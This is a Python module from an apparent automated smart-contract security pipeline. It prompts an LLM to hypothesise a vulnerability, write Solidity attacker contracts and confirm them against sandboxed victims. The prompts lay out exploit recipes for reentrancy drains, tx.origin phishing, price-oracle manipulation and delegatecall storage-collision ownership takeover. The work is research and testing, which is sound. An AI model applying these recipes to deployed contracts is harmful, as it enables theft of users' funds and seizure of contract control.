"""
Unlabeled end-to-end pipeline: hypothesis -> dispatch -> autostage -> synthesis -> execution,
with no human label anywhere. The damage oracle comes from the model's own hypothesis
(dispatch.py) and the execution rig is derived from the source (staging.py). The only inputs
are the contract source and the model's output.

Per contract, per rep:
  1. hypothesis prompt -> {vulnerability_id, function, expected_effect, ...}
  2. dispatch(hyp) -> ranked damage oracles; take the top. [] => ABSTAIN (no oracle).
  3. autostage(src, oracle) -> victim/funding/params/interface. None => ABSTAIN (cannot stage).
  4. oracle-aware synthesis prompt (value-extraction vs authority-seizure), bounded self-repair.
  5. run_case through the dispatched damage oracle.

Responses are cached (.cache/d3) by {model|rep|contract|stage|attempt}, so reps are independent
trials and re-runs are free and deterministic. This module is a library; `run_one` is its entry
point (see try_contract.py / scan.py for the command-line tools).
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

import requests
from dotenv import load_dotenv

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent))
from m3_hypothesis import build_prompt as m3_prompt
from bridge import Case, run_case, CONFIRMED, SUSPECTED, EXCLUDED
from dispatch import dispatch
from staging import autostage, UNIT, resolve_oracle, TXORIGIN_OWNER

load_dotenv(HERE.parent / ".env"); load_dotenv()
GPT_API_KEY = os.getenv("GPT_API_KEY")
MODEL = os.getenv("D3_MODEL", "gpt-4o-mini")   # override with a stronger model to raise recall
MAX_ATTEMPTS = 3
CACHE = HERE / ".cache" / "d3"


def _commit() -> str:
    try:
        return subprocess.check_output(["git", "rev-parse", "--short", "HEAD"], cwd=HERE, text=True).strip()
    except Exception:
        return "unknown"


def _payload_variants(messages, max_tokens):
    """Shapes tried in order until one returns 200 — old (temperature+max_tokens+response_format) and
    new (max_completion_tokens, no temperature, no response_format) APIs, so both older and newer
    models run through the same pipeline."""
    tok = [{"temperature": 0, "max_tokens": max_tokens}, {"max_completion_tokens": max_tokens},
           {"temperature": 0, "max_completion_tokens": max_tokens}, {"max_tokens": max_tokens}]
    out = []
    for use_rf in (True, False):
        for tv in tok:
            p = {"model": MODEL, "messages": messages, **tv}
            if use_rf:
                p["response_format"] = {"type": "json_object"}
            out.append(p)
    return out


def _lenient_json(raw: str):
    try:
        return json.loads(raw)
    except Exception:
        i, j = raw.find("{"), raw.rfind("}")
        if i != -1 and j > i:
            return json.loads(raw[i:j + 1])
        raise


def llm(messages, cache_key, kind, max_tokens) -> dict:
    d = CACHE / kind
    d.mkdir(parents=True, exist_ok=True)
    fp = d / f"{hashlib.sha256(cache_key.encode()).hexdigest()}.json"   # cache_key already embeds MODEL
    if fp.exists():
        try:
            return json.loads(fp.read_text())
        except (json.JSONDecodeError, OSError):
            pass            # corrupt/partial cache entry (e.g. interrupted write) -> re-fetch below
    last = "http error"
    for payload in _payload_variants(messages, max_tokens):
        for _ in range(2):
            try:
                r = requests.post("https://api.openai.com/v1/chat/completions",
                    headers={"Authorization": f"Bearer {GPT_API_KEY}", "Content-Type": "application/json"},
                    json=payload, timeout=150)
                if r.status_code == 200:
                    raw = r.json()["choices"][0]["message"]["content"]
                    try:
                        out = {"ok": True, "parsed": _lenient_json(raw), "raw": raw}
                    except Exception as e:
                        last = f"unparseable JSON: {e}"; break
                    tmp = fp.with_suffix(".json.tmp")   # atomic write: a crash/concurrent run can
                    tmp.write_text(json.dumps(out))     # never leave a half-written cache file
                    os.replace(tmp, fp)
                    return out
                last = f"HTTP {r.status_code}"
                if r.status_code in (400, 404):
                    break                                    # wrong shape for this model -> next variant
            except Exception as e:
                last = str(e); time.sleep(3)
    return {"ok": False, "parsed": None, "error": last}


SYS = "You are a senior Solidity exploit developer. Respond ONLY with a single JSON object."


# Counterfactual constraint (mechanism attribution): appended when we are testing whether the drain
# is achievable WITHOUT re-entry. A confirm under this constraint proves the victim can be drained by
# a single direct call -> the bug is an unprotected/direct drain, not reentrancy. Failure to drain
# directly (while the unconstrained exploit drained) is evidence re-entry was load-bearing -> reentrancy.
DIRECT_ONLY_SUFFIX = """

MECHANISM COUNTERFACTUAL — DRAIN WITHOUT RE-ENTRY:
Write the exploit so it drains the victim in a SINGLE direct call path. Your Attacker's
`receive()`/`fallback()` MUST be inert — it may accept ETH but MUST NOT call back into the victim
(no re-entrancy, no recursion into any victim function). Extract the value with one top-level call
(use the largest valid amount, e.g. `address(victim).balance`, if the function takes an amount).
If the victim can only be drained by re-entering it, that is expected — return your best single-call
attempt anyway. Same JSON fields as before."""


def synth_prompt(src, hyp, st, oracle, direct_only=False):
    p = _synth_prompt_base(src, hyp, st, oracle)
    return p + DIRECT_ONLY_SUFFIX if direct_only else p


def _synth_prompt_base(src, hyp, st, oracle):
    base = resolve_oracle(oracle)
    iface = st.interface
    fn, effect = hyp.get("function"), hyp.get("expected_effect")
    if base in ("1.1", "1.1-reentrant") and st.note == "txorigin":
        # tx.origin phishing (3.2). The victim authorizes with `tx.origin == owner`. The harness has
        # set owner to a real EOA and will make that EOA (phished) call your attacker.attack() — so at
        # the victim, tx.origin == owner (passes) while msg.sender == your attacker. You only write the
        # attacker; the harness writes the phishing trigger (you must NOT, and cannot, use vm.*).
        return f"""Write the ATTACKER for a tx.origin phishing exploit. The victim (address `victim`) is
funded with ETH and guards a privileged fund-moving function with `require(tx.origin == owner)`. Use
this interface (do NOT redeclare it):
    {iface}
The harness sets the victim's owner to a real EOA and then — simulating a phished owner — calls your
`attacker.attack()` FROM that owner EOA, so inside the victim tx.origin == owner (the check passes)
while msg.sender is your Attacker. The harness then asserts (you do NOT write it) that the attacker
ended with MORE ether and the victim was drained.
You write ONE field, attacker_source: `contract Attacker {{ ... }}` (Solidity ^0.8),
`constructor(address a)` storing the victim, a `receive() external payable {{}}`, and
`function attack() external` that calls the tx.origin-guarded drain on IVictim(victim) with
`address(this)` as the recipient (and `address(victim).balance` as the amount if it takes one), so the
victim's ETH is sent to your Attacker. Do NOT create the Attacker or call attack() yourself and do NOT
use any vm.* cheatcode — the harness does the phished trigger.
Hypothesis: function={fn}, effect={effect}.
Victim source:
```solidity
{src}
```
Return JSON: {{"attacker_source": "..."}}"""
    if base in ("1.1", "1.1-reentrant") and st.note.startswith("price-source"):
        # Value extraction through a manipulable price read (3.3). No stake needed (deposit_wei=0):
        # the exploit deposits collateral then borrows the victim's ETH valued at the price it reads.
        return f"""Write the ATTACKER for a price-manipulation / under-collateralized-borrow exploit.
The harness has deployed the victim (address `victim`), funded it with ETH to lend, and wired it to a
price source it reads. Use this interface (do NOT redeclare it):
    {iface}
The harness runs your code in test_exploit(), then asserts (you do NOT write the assertion) that the
attacker ends with MORE ether than it started and the victim's ETH is drained.

How these lending victims work and how to drain them (follow this recipe):
1. The victim lets you register collateral (a deposit*/addCollateral* function) and then borrow ETH
   valued at the price it reads from its source. Your goal: borrow the victim's whole ETH balance,
   `address(victim).balance`, and repay nothing.
2. SIMPLEST PATH — try this first: call the collateral function with a HUGE amount, then call the
   borrow function for `address(victim).balance`. In many victims the collateral deposit does not
   actually pull a token from you (no transferFrom), so a large synthetic deposit alone makes you
   over-collateralized at the honest price. One call each, no manipulation needed.
3. IF borrow reverts "undercollateralized" (the honest price is too low for your deposit): MANIPULATE
   the price source first. The source is a HARNESS-OWNED MOCK you may write to. Read its address from
   the victim's source getter in the interface (e.g. `victim.pair()` / `victim.priceFeed()`), cast it
   to the mock type shown above, and move the price in your favour BEFORE borrowing — for a Uniswap
   pair call `setReserves(uint112 reserve0, uint112 reserve1)` to inflate the token's ETH price
   (raise reserve1 and/or lower reserve0, since price = reserve1/reserve0); for a Chainlink feed call
   `setAnswer(int256, uint256)` with a large answer and `block.timestamp`.
4. Then borrow `address(victim).balance`. Do NOT use any vm.* cheatcode.

You write TWO fields:
- attacker_source: `contract Attacker {{ ... }}` (Solidity ^0.8), `constructor(address a)`, with a
  `receive() external payable {{}}`.
- attacker_entry: MUST create `Attacker attacker = new Attacker(victim);` with NO ether, then drive
  the exploit so the attacker ends with more ether than it started.
Hypothesis: function={fn}, effect={effect}.
Victim source:
```solidity
{src}
```
Return JSON: {{"attacker_source": "...", "attacker_entry": "..."}}"""
    if base in ("1.1", "1.1-reentrant"):
        return f"""Write the ATTACKER for a value-extraction exploit (reentrancy-style). The harness has
deployed the victim (address `victim`), funded it with other users' ether, and etched stubs for any
absent external dependency. Use this interface (do NOT redeclare it):
    {iface}
The harness runs your code in test_exploit(), then asserts (you do NOT write the assertion) that the
attacker ends with MORE than {UNIT} and the victim is drained.
You write TWO fields:
- attacker_source: `contract Attacker {{ ... }}` (Solidity ^0.8). Use IVictim(victim). Re-enter via
  `receive() external payable {{ ... }}`. Constructor must be `constructor(address a) payable`.
- attacker_entry: MUST create `Attacker attacker = new Attacker{{value: {UNIT}}}(victim);` and drive the
  exploit so the attacker ends with more than {UNIT}. Cheatcodes allowed here: vm.warp, vm.roll.
Notes that apply to SOME victims (use only if the source calls for them):
- If a deposit must clear a minimum balance before withdrawal is allowed, stake enough to clear it.
- If withdrawal is gated by an unlock time or block (e.g. `now > unlockTime`), do the deposit first,
  then advance time in attacker_entry — `vm.roll(block.number + 1); vm.warp(block.timestamp + 2);` —
  and only then withdraw/re-enter.
Hypothesis: function={fn}, effect={effect}.
Victim source:
```solidity
{src}
```
Return JSON: {{"attacker_source": "...", "attacker_entry": "..."}}"""
    # AUTHORITY_SEIZURE
    delegatecall_hint = ""
    if st.note.startswith("proxy:"):
        # Proxy whose implementation is a FIXED same-file module (set in the constructor, no setter —
        # you canNOT swap it). The module's code is in the source below. delegatecall runs it in the
        # VICTIM's storage, so a module function writing its own slot-N variable writes the victim's
        # slot N. Seize ownership by driving the module's setter onto the victim's `owner` slot.
        mm = re.search(r"bundled module (\w+)", st.note)
        mod = mm.group(1) if mm else "the implementation module"
        delegatecall_hint = f"""
PROXY WITH A FIXED MODULE — the victim forwards raw calldata to a FIXED implementation contract
`{mod}` (shown in the source below) via a `delegatecall`. You cannot replace it; exploit the one that
is there via a STORAGE-LAYOUT COLLISION:
  1. In the source, find the victim's `owner` storage SLOT — count top-level state variables from 0,
     base contracts first (packing aside, one slot each).
  2. In `{mod}`, find a PUBLIC function whose assignment lands on that SAME slot number in the module's
     own layout (e.g. if the victim's owner is slot 0, pick the module function that writes the
     module's slot-0 state variable — even if that variable is named `value`).
  3. Call the victim's bytes-forwarding function (the one that does the delegatecall) with calldata for
     that module function, passing your Attacker as the value, e.g.:
       IVictim(victim).<forwarder>(abi.encodeWithSelector({mod}.<fn>.selector, uint256(uint160(address(this)))));
     Use the `uint256(uint160(address(this)))` cast when the module fn takes a uint; pass
     `address(this)` directly when it takes an address.
  4. After the call the victim's owner slot holds your Attacker. Do NOT use any vm.* cheatcode, and do
     NOT try to deploy or register your own implementation — it is fixed."""
    elif "delegatecall" in src:
        delegatecall_hint = """
DELEGATECALL VECTOR (this victim delegatecalls an address/calldata you can influence): the privileged
write may be reachable ONLY through an unguarded delegatecall. To seize ownership through it:
  1. Define a SECOND contract in attacker_source, e.g. `contract Impl { address public owner;
     function pwn() external { owner = msg.sender; } }`. Its storage layout must put the privileged
     variable at the SAME slot as the victim's (for `address public owner` at slot 0, declare
     `address public owner` first in Impl too).
  2. Make the victim delegatecall your Impl's pwn(): either pass it directly (e.g.
     `victim.execute(address(impl), abi.encodeWithSignature("pwn()"))`) or FIRST register it as the
     target/library the victim uses (e.g. `victim.registerLib(name, address(impl))`) then trigger the
     op. In delegatecall your Impl runs in the victim's storage with msg.sender = the caller (your
     Attacker), so `owner = msg.sender` overwrites the VICTIM's owner to your Attacker.
  3. Deploy Impl in attacker_entry and pass its address in; the Attacker must be the delegatecall
     caller so it becomes owner. Do NOT use any vm.* cheatcode."""
    return f"""Write the ATTACKER for an access-control takeover. The harness has deployed the victim
(address `victim`). Use this interface (do NOT redeclare it):
    {iface}
The harness runs your code in test_exploit(), then asserts (you do NOT write the assertion) that the
attacker now holds the privileged role (owner/creator/admin).
You write TWO fields:
- attacker_source: `contract Attacker {{ ... }}` (Solidity ^0.8). Constructor `constructor(address a)`.
  A function that calls the UNPROTECTED privileged path on IVictim(victim) so address(this) (or this
  Attacker) becomes the privileged account. You MAY define extra helper contracts here too.
- attacker_entry: MUST create `Attacker attacker = new Attacker(victim);` and invoke the seize path.
Hypothesis: function={fn}, effect={effect}.{delegatecall_hint}
Victim source:
```solidity
{src}
```
Return JSON: {{"attacker_source": "...", "attacker_entry": "..."}}"""


def to_case(src, st, oracle, pieces) -> Case:
    base = resolve_oracle(oracle)
    aid = oracle
    if base == "2.1" and "getter" in st.assertion_params:
        aid = "AUTHORITY_SEIZURE_GETTER"
    atk = pieces.get("attacker_source", "")
    entry = pieces.get("attacker_entry", "")
    untrusted = None
    if st.note == "txorigin":
        # tx.origin phishing: the HARNESS writes the phished trigger (the owner EOA calls attack()),
        # not the model. Build the entry here and pass the model's attacker_source as `untrusted` so
        # the body-cheatcode check is skipped for the harness-authored vm.prank (same pattern as 2.4/
        # 2.5). msg.sender at the victim becomes the Attacker; tx.origin becomes the phished owner.
        o = TXORIGIN_OWNER
        entry = (f"Attacker attacker = new Attacker(victim); vm.deal({o}, 1 ether); "
                 f"vm.prank({o}, {o}); attacker.attack();")
        untrusted = [atk]
    return Case(victim_source=src, victim_name=st.victim_name,
                victim_interface=st.interface,
                attacker_source=atk, attacker_entry=entry,
                setup_body=st.setup_body, pre_setup_body=st.pre_setup_body,
                assertion_id=aid, assertion_params=st.assertion_params, ctor_args=st.ctor_args,
                untrusted=untrusted)


def run_one(klass, dataset, fname, rep, src=None, key=None) -> dict:
    """Analyze one contract. Pass `src` (and a `key` for the cache slot) to analyze an in-memory
    source directly; otherwise the source is read from `dataset / fname`."""
    src = src if src is not None else (dataset / fname).read_text(errors="ignore")
    key = key or fname
    rec = {"contract": key, "true_class": klass, "rep": rep, "commit": _commit(),
           "provider": MODEL, "verdict": None, "oracle": None, "attempts": 0, "detail": ""}

    h = llm([{"role": "user", "content": m3_prompt(src)}],
            f"{MODEL}|rep{rep}|{key}|hyp", "hypothesis", 400)
    hyp = (h.get("parsed") or {}) if h.get("ok") else {}
    rec["hypothesis"] = {k: hyp.get(k) for k in ("vulnerability_id", "function", "expected_effect")}

    cands = dispatch(hyp)
    if not cands:
        rec.update(verdict="ABSTAIN", detail="dispatch: no oracle for hypothesis"); return rec
    rec["candidates"] = cands

    # Candidate fall-through: dispatch's ranking is a preference, not a commitment. Try each ranked
    # oracle (re-stage + re-synthesize) and stop at the first CONFIRMED. Fixes misroutes where a loose
    # effect keyword outranks the model's explicit class. Capped so cost stays bounded.
    rec["tried"] = []
    best = ("ABSTAIN", "autostage: cannot stage any candidate")
    for ci, oracle in enumerate(cands[:MAX_CANDIDATES]):
        st = autostage(src, oracle)
        if st is None:
            rec["tried"].append({"oracle": oracle, "verdict": "ABSTAIN"}); continue
        verdict, detail, attempts, pieces, mechanism = _synthesize(src, hyp, st, oracle, key, rep, ci)
        rec["tried"].append({"oracle": oracle, "verdict": verdict, "attempts": attempts})
        if _RANK[verdict] > _RANK[best[0]] or not rec.get("oracle"):
            best = (verdict, detail)
            rec.update(oracle=oracle, victim=st.victim_name, attempts=attempts,
                       mechanism=mechanism,
                       attacker_source=pieces.get("attacker_source", ""),
                       attacker_entry=pieces.get("attacker_entry", ""))
        if verdict == CONFIRMED:
            break
    rec.update(verdict=best[0], detail=best[1])
    return rec


MAX_CANDIDATES = 2
_RANK = {"ABSTAIN": 0, EXCLUDED: 1, SUSPECTED: 2, CONFIRMED: 3}


def _synthesize(src, hyp, st, oracle, fname, rep, ci, direct_only=False):
    """L4+L5 for one candidate oracle with bounded self-repair. The TOP candidate keeps the original
    positional cache keys (so earlier runs stay byte-reproducible); fallback candidates add the oracle.

    direct_only=True runs the mechanism counterfactual: synthesize a drain that does NOT re-enter the
    victim, and REJECT any CONFIRMED attempt whose trace still shows re-entry (not an answer to
    "can it be drained directly?"). Returns CONFIRMED only on a confirmed NON-reentrant drain."""
    tag = "" if ci == 0 else f"|cand={oracle}"
    msgs = [{"role": "system", "content": SYS},
            {"role": "user", "content": synth_prompt(src, hyp, st, oracle, direct_only=direct_only)}]
    verdict, detail, attempts, pieces, mechanism = EXCLUDED, "no LLM output", 0, {}, None
    for attempt in range(1, MAX_ATTEMPTS + 1):
        attempts = attempt
        res = llm(msgs, f"{MODEL}|rep{rep}|{fname}|synth|att{attempt}{tag}", "synthesis", 1600)
        if not res.get("ok") or not res.get("parsed"):
            verdict, detail = EXCLUDED, "no LLM output"; break
        pieces = res["parsed"]
        v = run_case(to_case(src, st, oracle, pieces), isolated=True)
        verdict = v.status
        detail = (v.error or (v.summary() if v.tests else ""))[:70]
        mechanism = v.mechanism
        if v.status == CONFIRMED:
            if direct_only and v.mechanism == "reentrant":
                # A re-entrant confirm does not answer "can it be drained without re-entry?". Push back
                # and keep trying for a single-call drain; if none is found the drain needs re-entry.
                verdict = SUSPECTED
                msgs += [{"role": "assistant", "content": res["raw"]},
                         {"role": "user", "content": "You re-entered the victim (a call back into it "
                          "before the first returned). Drain in a SINGLE direct call with an inert "
                          "receive/fallback (no re-entry). Return the full JSON again."}]
                continue
            break
        fb = v.error or (v.tests[0].reason if v.tests else "") or "no effect"
        msgs += [{"role": "assistant", "content": res["raw"]},
                 {"role": "user", "content": f"That was {v.status}: {fb}. Fix attacker_source/"
                  f"attacker_entry. Return the full JSON again."}]
    return verdict, detail, attempts, pieces, mechanism
